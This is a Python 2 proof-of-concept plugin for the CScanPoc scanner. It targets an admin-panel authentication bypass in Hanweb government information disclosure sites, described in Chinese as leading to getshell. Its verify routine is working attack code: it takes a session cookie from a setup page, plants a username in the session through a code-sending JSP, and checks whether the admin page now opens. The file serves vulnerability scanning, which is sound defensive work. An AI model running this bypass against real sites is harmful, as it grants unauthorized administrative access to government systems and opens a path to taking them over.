# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '529e2ad4-4943-4d62-8d58-7f54d9e9fd8b'
    name = '大汉政府信息公开网站群存在getshell的风险' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '2016-02-15'  # 漏洞公布时间
    desc = '''
        大汉政府信息公开网站群存在getshell的风险,管理后台权限绕过，进入后台后轻松GetShell.
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0152666
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '41f669fd-8a1f-4693-8269-83f734eed54b'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/setup/opr_licenceinfo.jsp"
            code, head, res, errcode, _ = hh.http(url)
            if "top.location='index.html'" in res and re.search('Set-Cookie: ([a-zA-Z0-9=]*);', head):
                url1 = arg + '/jcms_files/jcms1/web1/site/zfxxgk/ysqgk/sendcode.jsp?webid=2&destnum=cookie_username'
                cookie = re.search('Set-Cookie: ([a-zA-Z0-9=]*);', head).group(1)
                code, head, res, errcode, _ = hh.http(url1, cookie = cookie)
                code, head, res, errcode, _ = hh.http(url, cookie = cookie)
                if "top.location='index.html'" not in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()